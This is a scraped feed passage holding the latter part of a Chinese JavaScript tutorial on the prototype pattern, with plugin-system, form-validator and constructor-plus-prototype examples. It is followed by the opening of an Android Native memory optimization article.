<span class="hljs-title class_">Level8</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-title class_">Level7</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);
<span class="hljs-title class_">Level9</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-title class_">Level8</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);
<span class="hljs-title class_">Level10</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-title class_">Level9</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);

<span class="hljs-title class_">Level10</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">value</span> = <span class="hljs-string">"在最底层"</span>;

<span class="hljs-keyword">const</span> obj = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Level10</span>();

<span class="hljs-comment">// 查找value需要遍历10层原型链！</span>
<span class="hljs-keyword">let</span> value = obj.<span class="hljs-property">value</span>;
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">timeEnd</span>(<span class="hljs-string">"创建深层原型链"</span>);

<span class="hljs-comment">// 性能测试：多次访问</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">time</span>(<span class="hljs-string">"访问深层属性10000次"</span>);
<span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10000</span>; i++) {
    <span class="hljs-keyword">const</span> temp = obj.<span class="hljs-property">value</span>;
}
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">timeEnd</span>(<span class="hljs-string">"访问深层属性10000次"</span>);

<span class="hljs-comment">// 对比：浅层原型链</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">Shallow</span>(<span class="hljs-params"/>) {}
<span class="hljs-title class_">Shallow</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">value</span> = <span class="hljs-string">"在原型上"</span>;
<span class="hljs-keyword">const</span> shallowObj = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Shallow</span>();

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">time</span>(<span class="hljs-string">"访问浅层属性10000次"</span>);
<span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10000</span>; i++) {
    <span class="hljs-keyword">const</span> temp = shallowObj.<span class="hljs-property">value</span>;
}
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">timeEnd</span>(<span class="hljs-string">"访问浅层属性10000次"</span>);
</code></pre>
<h3 data-id="heading-46">4.6 原型模式的实际应用</h3>
<h4 data-id="heading-47">4.6.1 插件系统设计</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 使用原型模式实现可扩展的插件系统</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">PluginSystem</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">plugins</span> = [];
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">hooks</span> = {};
}

<span class="hljs-title class_">PluginSystem</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = {
    <span class="hljs-attr">constructor</span>: <span class="hljs-title class_">PluginSystem</span>,
    
    <span class="hljs-comment">// 注册插件</span>
    <span class="hljs-attr">register</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">plugin</span>) {
        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> plugin.<span class="hljs-property">install</span> === <span class="hljs-string">'function'</span>) {
            plugin.<span class="hljs-title function_">install</span>(<span class="hljs-variable language_">this</span>);
        }
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">plugins</span>.<span class="hljs-title function_">push</span>(plugin);
        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>;
    },
    
    <span class="hljs-comment">// 添加钩子</span>
    <span class="hljs-attr">addHook</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">name, callback</span>) {
        <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">this</span>.<span class="hljs-property">hooks</span>[name]) {
            <span class="hljs-variable language_">this</span>.<span class="hljs-property">hooks</span>[name] = [];
        }
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">hooks</span>[name].<span class="hljs-title function_">push</span>(callback);
        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>;
    },
    
    <span class="hljs-comment">// 触发钩子</span>
    <span class="hljs-attr">triggerHook</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">name, ...args</span>) {
        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">hooks</span>[name]) {
            <span class="hljs-variable language_">this</span>.<span class="hljs-property">hooks</span>[name].<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">callback</span> =&gt;</span> {
                callback.<span class="hljs-title function_">apply</span>(<span class="hljs-variable language_">this</span>, args);
            });
        }
        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>;
    },
    
    <span class="hljs-comment">// 获取所有插件</span>
    <span class="hljs-attr">getPlugins</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">plugins</span>.<span class="hljs-title function_">slice</span>(); <span class="hljs-comment">// 返回副本</span>
    }
};

<span class="hljs-comment">// 插件示例</span>
<span class="hljs-keyword">const</span> <span class="hljs-title class_">LoggerPlugin</span> = {
    <span class="hljs-attr">name</span>: <span class="hljs-string">'Logger'</span>,
    <span class="hljs-attr">install</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">system</span>) {
        system.<span class="hljs-title function_">addHook</span>(<span class="hljs-string">'beforeAction'</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">action</span>) {
            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`[Logger] 即将执行: <span class="hljs-subst">${action}</span>`</span>);
        });
        
        system.<span class="hljs-title function_">addHook</span>(<span class="hljs-string">'afterAction'</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">action, result</span>) {
            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`[Logger] 执行完成: <span class="hljs-subst">${action}</span>, 结果:`</span>, result);
        });
    }
};

<span class="hljs-keyword">const</span> <span class="hljs-title class_">ValidatorPlugin</span> = {
    <span class="hljs-attr">name</span>: <span class="hljs-string">'Validator'</span>,
    <span class="hljs-attr">install</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">system</span>) {
        system.<span class="hljs-title function_">addHook</span>(<span class="hljs-string">'beforeAction'</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">action</span>) {
            <span class="hljs-keyword">if</span> (!action) {
                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">'Action不能为空'</span>);
            }
            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`[Validator] 验证通过: <span class="hljs-subst">${action}</span>`</span>);
        });
    }
};

<span class="hljs-comment">// 使用插件系统</span>
<span class="hljs-keyword">const</span> system = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PluginSystem</span>();
system.<span class="hljs-title function_">register</span>(<span class="hljs-title class_">LoggerPlugin</span>)
     .<span class="hljs-title function_">register</span>(<span class="hljs-title class_">ValidatorPlugin</span>);

system.<span class="hljs-title function_">triggerHook</span>(<span class="hljs-string">'beforeAction'</span>, <span class="hljs-string">'用户登录'</span>);
<span class="hljs-comment">// 输出：</span>
<span class="hljs-comment">// [Logger] 即将执行: 用户登录</span>
<span class="hljs-comment">// [Validator] 验证通过: 用户登录</span>

<span class="hljs-comment">// 所有PluginSystem实例共享原型方法，但各有自己的插件和钩子</span>
</code></pre>
<h4 data-id="heading-48">4.6.2 表单验证系统</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Validator</span>(<span class="hljs-params">rules</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">rules</span> = rules || {};
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">errors</span> = {};
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">isValid</span> = <span class="hljs-literal">true</span>;
}

<span class="hljs-title class_">Validator</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = {
    <span class="hljs-attr">constructor</span>: <span class="hljs-title class_">Validator</span>,
    
    <span class="hljs-comment">// 添加验证规则</span>
    <span class="hljs-attr">addRule</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">field, ruleFn, message</span>) {
        <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">this</span>.<span class="hljs-property">rules</span>[field]) {
            <span class="hljs-variable language_">this</span>.<span class="hljs-property">rules</span>[field] = [];
        }
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">rules</span>[field].<span class="hljs-title function_">push</span>({
            <span class="hljs-attr">validate</span>: ruleFn,
            <span class="hljs-attr">message</span>: message
        });
        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>;
    },
    
    <span class="hljs-comment">// 验证字段</span>
    <span class="hljs-attr">validateField</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">field, value</span>) {
        <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">this</span>.<span class="hljs-property">rules</span>[field]) {
            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
        }
        
        <span class="hljs-keyword">let</span> isValid = <span class="hljs-literal">true</span>;
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">errors</span>[field] = [];
        
        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> rule <span class="hljs-keyword">of</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">rules</span>[field]) {
            <span class="hljs-keyword">if</span> (!rule.<span class="hljs-title function_">validate</span>(value)) {
                isValid = <span class="hljs-literal">false</span>;
                <span class="hljs-variable language_">this</span>.<span class="hljs-property">errors</span>[field].<span class="hljs-title function_">push</span>(rule.<span class="hljs-property">message</span>);
            }
        }
        
        <span class="hljs-keyword">if</span> (!isValid) {
            <span class="hljs-variable language_">this</span>.<span class="hljs-property">isValid</span> = <span class="hljs-literal">false</span>;
        }
        
        <span class="hljs-keyword">return</span> isValid;
    },
    
    <span class="hljs-comment">// 验证整个表单</span>
    <span class="hljs-attr">validateForm</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">data</span>) {
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">errors</span> = {};
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">isValid</span> = <span class="hljs-literal">true</span>;
        
        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> field <span class="hljs-keyword">in</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">rules</span>) {
            <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">validateField</span>(field, data[field]);
        }
        
        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">isValid</span>;
    },
    
    <span class="hljs-comment">// 获取错误信息</span>
    <span class="hljs-attr">getErrors</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">errors</span>;
    },
    
    <span class="hljs-comment">// 获取字段的错误</span>
    <span class="hljs-attr">getFieldError</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">field</span>) {
        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">errors</span>[field] || [];
    },
    
    <span class="hljs-comment">// 静态方法：常用验证规则</span>
    <span class="hljs-keyword">static</span> <span class="hljs-attr">rules</span>: {
        <span class="hljs-attr">required</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">value</span>) {
            <span class="hljs-keyword">return</span> value !== <span class="hljs-literal">undefined</span> &amp;&amp; value !== <span class="hljs-literal">null</span> &amp;&amp; value !== <span class="hljs-string">''</span>;
        },
        
        <span class="hljs-attr">minLength</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">min</span>) {
            <span class="hljs-keyword">return</span> <span class="hljs-keyword">function</span>(<span class="hljs-params">value</span>) {
                <span class="hljs-keyword">return</span> value &amp;&amp; value.<span class="hljs-property">length</span> &gt;= min;
            };
        },
        
        <span class="hljs-attr">maxLength</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">max</span>) {
            <span class="hljs-keyword">return</span> <span class="hljs-keyword">function</span>(<span class="hljs-params">value</span>) {
                <span class="hljs-keyword">return</span> !value || value.<span class="hljs-property">length</span> &lt;= max;
            };
        },
        
        <span class="hljs-attr">email</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">value</span>) {
            <span class="hljs-keyword">const</span> emailRegex = <span class="hljs-regexp">/^[^\s@]+@[^\s@]+\.[^\s@]+$/</span>;
            <span class="hljs-keyword">return</span> !value || emailRegex.<span class="hljs-title function_">test</span>(value);
        }
    }
};

<span class="hljs-comment">// 使用示例</span>
<span class="hljs-keyword">const</span> formValidator = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Validator</span>();

<span class="hljs-comment">// 添加验证规则</span>
formValidator
    .<span class="hljs-title function_">addRule</span>(<span class="hljs-string">'username'</span>, 
        <span class="hljs-title class_">Validator</span>.<span class="hljs-property">rules</span>.<span class="hljs-property">required</span>, 
        <span class="hljs-string">'用户名不能为空'</span>)
    .<span class="hljs-title function_">addRule</span>(<span class="hljs-string">'username'</span>,
        <span class="hljs-title class_">Validator</span>.<span class="hljs-property">rules</span>.<span class="hljs-title function_">minLength</span>(<span class="hljs-number">3</span>),
        <span class="hljs-string">'用户名至少3个字符'</span>)
    .<span class="hljs-title function_">addRule</span>(<span class="hljs-string">'email'</span>,
        <span class="hljs-title class_">Validator</span>.<span class="hljs-property">rules</span>.<span class="hljs-property">email</span>,
        <span class="hljs-string">'邮箱格式不正确'</span>);

<span class="hljs-comment">// 验证数据</span>
<span class="hljs-keyword">const</span> formData = {
    <span class="hljs-attr">username</span>: <span class="hljs-string">'ab'</span>,
    <span class="hljs-attr">email</span>: <span class="hljs-string">'invalid-email'</span>
};

<span class="hljs-keyword">const</span> isValid = formValidator.<span class="hljs-title function_">validateForm</span>(formData);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'验证结果:'</span>, isValid); <span class="hljs-comment">// false</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'错误信息:'</span>, formValidator.<span class="hljs-title function_">getErrors</span>());
<span class="hljs-comment">// 输出：{ username: ['用户名至少3个字符'], email: ['邮箱格式不正确'] }</span>
</code></pre>
<h3 data-id="heading-49">4.7 原型模式的优缺点总结</h3>
<h4 data-id="heading-50">优点：</h4>
<ol>
<li><strong>内存高效</strong>：方法只在原型上存储一次，所有实例共享</li>
<li><strong>动态性</strong>：可以随时修改原型，影响所有实例</li>
<li><strong>代码复用</strong>：共享方法减少重复代码</li>
<li><strong>继承基础</strong>：为JavaScript的继承机制提供基础</li>
</ol>
<h4 data-id="heading-51">缺点：</h4>
<ol>
<li><strong>理解难度</strong>：原型链概念对初学者不友好</li>
<li><strong>共享状态的陷阱</strong>：如果原型上有引用类型属性，所有实例共享</li>
<li><strong>构造函数与原型分离</strong>：定义分散在两个地方</li>
<li><strong>性能考虑</strong>：过深原型链会影响属性查找速度</li>
</ol>
<h4 data-id="heading-52">适用场景：</h4>
<ol>
<li><strong>需要创建大量相似对象</strong>：如游戏中的NPC、UI组件</li>
<li><strong>对象有大量共享方法</strong>：如数据模型、工具类</li>
<li><strong>需要动态扩展对象能力</strong>：如插件系统</li>
<li><strong>实现继承机制</strong>：构建对象层次结构</li>
</ol>
<h3 data-id="heading-53">4.8 原型模式与构造函数的结合</h3>
<p>在实际开发中，我们总是将构造函数和原型模式结合使用：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 最佳实践：构造函数 + 原型模式</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">Cat</span>(<span class="hljs-params">name, color, age</span>) {
    <span class="hljs-comment">// 构造函数：处理实例特有属性</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">color</span> = color;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span> = age || <span class="hljs-number">1</span>;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">id</span> = <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>() + <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>(); <span class="hljs-comment">// 唯一ID</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">createdAt</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>();
}

<span class="hljs-comment">// 原型：处理共享方法和属性</span>
<span class="hljs-title class_">Cat</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = {
    <span class="hljs-attr">constructor</span>: <span class="hljs-title class_">Cat</span>, <span class="hljs-comment">// 重要：保持constructor指向</span>
    
    <span class="hljs-comment">// 共享属性</span>
    <span class="hljs-attr">species</span>: <span class="hljs-string">'猫科动物'</span>,
    <span class="hljs-attr">hasTail</span>: <span class="hljs-literal">true</span>,
    <span class="hljs-attr">legs</span>: <span class="hljs-number">4</span>,
    
    <span class="hljs-comment">// 共享方法</span>
    <span class="hljs-title function_">eat</span>(<span class="hljs-params">food</span>) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span>在吃<span class="hljs-subst">${food}</span>`</span>);
        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>; <span class="hljs-comment">// 支持链式调用</span>
    },
    
    <span class="hljs-title function_">sleep</span>(<span class="hljs-params">hours</span>) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span>睡了<span class="hljs-subst">${hours}</span>小时`</span>);
        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>;
    },
    
    <span class="hljs-title function_">getInfo</span>(<span class="hljs-params"/>) {
        <span class="hljs-keyword">return</span> <span class="hljs-string">`<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span>，<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.color}</span>色，<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.age}</span>岁`</span>;
    },
    
    <span class="hljs-comment">// 计算属性</span>
    <span class="hljs-keyword">get</span> <span class="hljs-title function_">isKitten</span>() {
        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span> &lt; <span class="hljs-number">1</span>;
    },
    
    <span class="hljs-comment">// 静态方法（通过实例访问）</span>
    <span class="hljs-attr">static</span>: {
        <span class="hljs-title function_">createKitten</span>(<span class="hljs-params">name, color</span>) {
            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cat</span>(name, color, <span class="hljs-number">0.5</span>);
        }
    }
};

<span class="hljs-comment">// 使用示例</span>
<span class="hljs-keyword">const</span> cat = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cat</span>(<span class="hljs-string">'咪咪'</span>, <span class="hljs-string">'白色'</span>, <span class="hljs-number">2</span>);
cat.<span class="hljs-title function_">eat</span>(<span class="hljs-string">'鱼'</span>).<span class="hljs-title function_">sleep</span>(<span class="hljs-number">8</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(cat.<span class="hljs-title function_">getInfo</span>());
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'是小猫吗？'</span>, cat.<span class="hljs-property">isKitten</span>);

<span class="hljs-comment">// 验证原型链</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(cat <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Cat</span>); <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(cat.<span class="hljs-property">constructor</span> === <span class="hljs-title class_">Cat</span>); <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(cat.<span class="hljs-title function_">hasOwnProperty</span>(<span class="hljs-string">'name'</span>)); <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(cat.<span class="hljs-title function_">hasOwnProperty</span>(<span class="hljs-string">'eat'</span>)); <span class="hljs-comment">// false</span>
</code></pre>
<p>这种组合模式是现代JavaScript开发中最常用的对象创建方式，它结合了两种模式的优点，避免了各自的缺点。</p>
<hr/></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Android Native内存优化：从“内存刺客”到“内存管家”的进阶指南]]></title>    <link>https://juejin.cn/post/7602206323460538419</link>    <guid>https://juejin.cn/post/7602206323460538419</guid>    <pubDate>2026-02-03T05:23:18.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602206323460538419" data-draft-id="7602177113685229619" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Android Native内存优化：从“内存刺客”到“内存管家”的进阶指南"/> <meta itemprop="keywords" content="面试,性能优化,Android"/> <meta itemprop="datePublished" content="2026-02-03T05:23:18.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="顾林海"/> <meta itemprop="url" content="https://juejin.cn/user/2365804752153911"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Android Native内存优化：从“内存刺客”到“内存管家”的进阶指南
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2365804752153911/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    顾林海
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T05:23:18.000Z" title="Tue Feb 03 2026 05:23:18 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读28分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">前言</h2>
<p>作为Android开发者，你是否遇到过这样的窘境：APP在模拟器上跑得风生水起，一到真机就频繁卡顿、闪退，日志里还飘着 <code>OutOfMemoryError: Native heap allocation failed</code> 的红色警告？这大概率是Native内存在“搞事情”。和Java内存有GC（垃圾回收）兜底不同，Native内存是“野孩子”——分配了不释放、释放不彻底，都会让内存像积水一样越积越多，最终把APP“淹死”。</p>
<p>今天，我们就来一场Native内存优化的“深度大扫除”，从底层原理到实战技巧，从工具使用到代码优化，手把手教你搞定Native内存泄漏、内存碎片，让你的APP从“吃内存大户”变身“内存省电大户”。全程干货拉满，还穿插趣味解读和实战代码，新手也能轻松跟上！</p>
<h2 data-id="heading-1">一、先搞懂：Native内存到底是个啥？</h2>
<h3 data-id="heading-2">1.1 Java内存 vs Native内存：俩“兄弟”差别大</h3>
<p>我们常说的Android内存，主要分为Java堆（Java Heap）和Native堆（Native Heap），二者就像两个独立的“储物间”，管理规则完全不同：</p>
<ul>
<li>
